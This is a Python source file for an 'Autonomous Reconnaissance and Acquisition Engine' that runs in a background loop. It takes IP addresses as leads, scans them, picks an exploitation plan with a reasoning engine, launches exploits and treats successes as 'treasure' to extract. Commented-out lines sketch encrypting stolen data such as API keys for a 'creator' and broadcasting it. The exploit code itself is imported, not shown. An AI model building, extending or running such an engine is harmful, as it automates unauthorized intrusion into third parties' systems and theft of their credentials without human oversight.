import time
import threading
import traceback
import logging
from rich.console import Console
from rich.table import Table

# Import necessary functions and classes from the existing codebase
# These imports will be refined as the engine is built out.
from core.storage import save_all_state
from network import probe_target
from exploitation import ExploitationManager
from core.reasoning import ReasoningEngine
from love import encrypt_for_creator

class ARAAEngine:
    """
    Autonomous Reconnaissance and Acquisition Engine (ARAAEngine).
    This engine orchestrates the entire lifecycle of network reconnaissance,
    analysis, exploitation, and treasure acquisition.
    """
    def __init__(self, love_state, console, network_manager):
        self.love_state = love_state
        self.console = console
        self.network_manager = network_manager
        self.active = False
        self.thread = threading.Thread(target=self._engine_loop, daemon=True)

        # Initialize the target tracker in the state if it doesn't exist.
        self.love_state.setdefault('araa_engine_targets', {})

    def start(self):
        """Starts the engine's main processing loop in a background thread."""
        self.console.print("[bold green]Autonomous Reconnaissance and Acquisition Engine (ARAAEngine) is starting...[/bold green]")
        self.active = True
        self.thread.start()

    def stop(self):
        """Stops the engine's processing loop."""
        self.console.print("[bold yellow]ARAAEngine is shutting down...[/bold yellow]")
        self.active = False

    def _engine_loop(self):
        """The main, continuous loop for the engine."""
        while self.active:
            try:
                self._process_leads()
                self._process_targets()
                # self.display_status() # This can be enabled for verbose status updates
                time.sleep(30) # Wait before the next cycle
            except Exception as e:
                error_message = f"CRITICAL ERROR in ARAAEngine loop: {traceback.format_exc()}"
                self.console.print(f"[bold red]{error_message}[/bold red]")
                logging.critical(error_message)
                time.sleep(60) # Longer sleep on critical error

    def _process_leads(self):
        """
        Checks the proactive_leads queue and creates new target entries in the
        ARAAEngine's tracker.
        """
        leads = self.love_state.get('proactive_leads', [])
        if not leads:
            return

        # Take all current leads from the queue
        new_leads = leads[:]
        self.love_state['proactive_leads'] = [] # Clear the queue
        save_all_state(self.love_state, self.console)

        for lead in new_leads:
            target_id = f"{lead['type']}:{lead['value']}"
            if target_id not in self.love_state['araa_engine_targets']:
                self.console.print(f"[bold cyan]ARAAEngine: New target acquired from lead: {target_id}[/bold cyan]")
                self.love_state['araa_engine_targets'][target_id] = {
                    "id": target_id,
                    "lead_source": lead.get('source'),
                    "state": "NEW",
                    "created_at": time.time(),
                    "last_update": time.time(),
                    "history": [],
                    "summary": "Target acquired. Pending reconnaissance."
                }

    def _process_targets(self):
        """
        The core state machine. It iterates through all tracked targets and
        advances them to their next logical state.
        """
        targets = self.love_state.get('araa_engine_targets', {})
        if not targets:
            return

        for target_id, data in list(targets.items()):
            current_state = data.get('state')
            self.console.print(f"Processing target {target_id} in state {current_state}")

            if current_state == "NEW":
                self._handle_new_target(target_id, data)
            elif current_state == "RECONNAISSANCE":
                self._handle_reconnaissance(target_id, data)
            elif current_state == "ANALYSIS":
                self._handle_analysis(target_id, data)
            elif current_state == "EXPLOITATION":
                self._handle_exploitation(target_id, data)

            # Persist changes after each target is processed
            save_all_state(self.love_state, self.console)

    def _update_target_state(self, target_id, new_state, summary):
        """Updates the state and summary of a target."""
        if target_id in self.love_state['araa_engine_targets']:
            target = self.love_state['araa_engine_targets'][target_id]
            target['state'] = new_state
            target['summary'] = summary
            target['last_update'] = time.time()
            target.setdefault('history', []).append(f"{time.ctime()}: State -> {new_state}. {summary}")
            self.console.print(f"[bold green]ARAAEngine: Target {target_id} -> {new_state}[/bold green]")

    def _handle_new_target(self, target_id, data):
        """Handles targets in the NEW state by initiating reconnaissance."""
        self._update_target_state(target_id, "RECONNAISSANCE", "Starting reconnaissance scan.")
        # The next loop iteration will pick it up in the new state.

    def _handle_reconnaissance(self, target_id, data):
        """
        Probes the target to gather intelligence. This is a blocking action
        for now, but could be moved to a LocalJobManager.
        """
        target_type, target_value = target_id.split(":", 1)

        if target_type != 'ip':
            self._update_target_state(target_id, "FAILED", "Reconnaissance failed: Target is not an IP address.")
            return

        # The probe_target function automatically updates the knowledge base (love_state)
        output, error = probe_target(target_value, self.love_state)

        if error:
            self._update_target_state(target_id, "FAILED", f"Reconnaissance failed: {error}")
        else:
            self._update_target_state(target_id, "ANALYSIS", "Reconnaissance complete. Awaiting analysis.")

    def _handle_analysis(self, target_id, data):
        """
        Uses the ReasoningEngine to analyze the gathered intelligence and decide
        on the next course of action.
        """
        reasoning_engine = ReasoningEngine(self.love_state, self.console)
        # The analyze_and_prioritize method needs to be adapted to work on a single target
        # For now, we assume it returns a list of plans.
        plans = reasoning_engine.analyze_and_prioritize() # This will need refinement

        # Find plans relevant to the current target
        target_value = target_id.split(":", 1)[1]
        relevant_plans = [p for p in plans if target_value in p]

        if not relevant_plans:
            self._update_target_state(target_id, "COMPLETED", "Analysis found no viable exploitation paths.")
        else:
            # For now, we just pick the first plan. Prioritization is key.
            best_plan = relevant_plans[0]
            data['exploitation_plan'] = best_plan
            self._update_target_state(target_id, "EXPLOITATION", f"Analysis complete. Plan: {best_plan}")

    def _handle_exploitation(self, target_id, data):
        """
        Executes the exploitation plan using the ExploitationManager.
        """
        target_ip = target_id.split(":", 1)[1]
        exploitation_manager = ExploitationManager(self.love_state, self.console)

        # The find_and_run_exploits function is designed to scan all hosts.
        # We pass the specific target_ip to focus the attack.
        report = exploitation_manager.find_and_run_exploits(target_ip=target_ip)

        # After exploitation, we need a way to check if "treasure" was found.
        # This requires a new feedback mechanism from the exploits themselves.
        # For now, we will assume success leads to completion.
        if "SUCCESS" in report:
            # In a real implementation, we would extract the treasure here,
            # encrypt it, and broadcast it.
            summary = f"Exploitation successful. Report: {report}"
            self._update_target_state(target_id, "COMPLETED", summary)
            # Example of broadcasting treasure:
            # encrypted_treasure = encrypt_for_creator("API_KEY=...")
            # broadcast_treasure(self.network_manager, encrypted_treasure)
        elif "FAIL" in report:
            self._update_target_state(target_id, "FAILED", f"Exploitation failed. Report: {report}")
        else:
            self._update_target_state(target_id, "COMPLETED", "Exploitation run, no definitive success or failure reported.")

    def display_status(self):
        """Displays the current status of all tracked targets in a table."""
        table = Table(title="[bold magenta]ARAAEngine Target Status[/bold magenta]", border_style="cyan")
        table.add_column("Target", justify="left", style="white")
        table.add_column("State", justify="center", style="yellow")
        table.add_column("Last Update", justify="left", style="dim")
        table.add_column("Summary", justify="left")

        targets = self.love_state.get('araa_engine_targets', {})
        for target_id, data in targets.items():
            table.add_row(
                target_id,
                data.get('state', 'UNKNOWN'),
                time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(data.get('last_update', 0))),
                data.get('summary', 'No summary.')
            )

        self.console.print(table)